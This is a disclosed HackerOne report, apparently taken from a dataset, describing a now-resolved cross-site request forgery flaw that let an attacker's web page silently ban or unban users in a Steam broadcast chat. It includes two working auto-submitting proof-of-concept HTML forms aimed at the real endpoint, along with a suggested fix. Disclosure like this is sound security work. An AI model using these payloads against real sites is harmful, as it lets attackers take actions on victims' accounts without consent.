---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '381237'
original_report_id: '381237'
title: CSRF | Ban or unban users in broadcast's chat
weakness: Cross-Site Request Forgery (CSRF)
team_handle: valve
created_at: '2018-07-13T12:28:25.015Z'
disclosed_at: '2019-01-07T20:07:39.180Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 9
asset_identifier: steamcommunity.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF | Ban or unban users in broadcast's chat

## Metadata

- HackerOne Report ID: 381237
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: valve
- Disclosed At: 2019-01-07T20:07:39.180Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

#Steps to reproduce
* Start broadcast
* Attacker needs to craft special HTML page
* Get broadcast's steam id(it contains in URL: `https://steamcommunity.com/broadcast/watch/{STEAM ID}/`
* If attacker wants to unban somebody, he needs to create HTML page like this:

```
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://steamcommunity.com/broadcast/ajaxupdateusermute/" method="POST" target="csrf-frame" id="csrf-form">
<input type="hidden" name="broadcaststeamid" value="{STEAM ID}">
<input type="hidden" name="issuersteamid" value="{STEAM ID}">
<input type="hidden" name="chattersteamid" value="{USER'S STEAM ID TO UNBAN}">
<input type="hidden" name="bantype" value="0">
<input type="hidden" name="duration" value="0">
<input type="hidden" name="perm" value="0">
</form>
<script>document.getElementById("csrf-form").submit()</script>
<html>
<head>
    <title>Unban in chat - CSRF</title>
</head>

<body>
<h1>Somebody was unbanned silently :/</h1>
</body>
</html>
```

* If attacker wants to permanently ban somebody, he needs to create HTML page like this:

```
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://steamcommunity.com/broadcast/ajaxupdateusermute/" method="POST" target="csrf-frame" id="csrf-form">
<input type="hidden" name="broadcaststeamid" value="{STEAM ID}">
<input type="hidden" name="issuersteamid" value="{STEAM ID}">
<input type="hidden" name="chattersteamid" value="{USER'S STEAM ID TO BAN}">
<input type="hidden" name="bantype" value="1">
<input type="hidden" name="duration" value="0">
<input type="hidden" name="perm" value="1">
</form>
<script>document.getElementById("csrf-form").submit()</script>
<html>
<head>
    <title>Ban in chat - CSRF</title>
</head>

<body>
<h1>Somebody was banned silently :/</h1>
</body>
</html>
```

* After that broadcast's creator needs to visit Attacker's page.
* And somebody will be banned/unbanned.

#Video PoC
*I banned myself, because i don't have third Steam account
{F320189}

#Fix
Add sessionid parameter to POST request, like this implemented in others requests.

## Impact

Attacker can permanently ban or unban other users.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
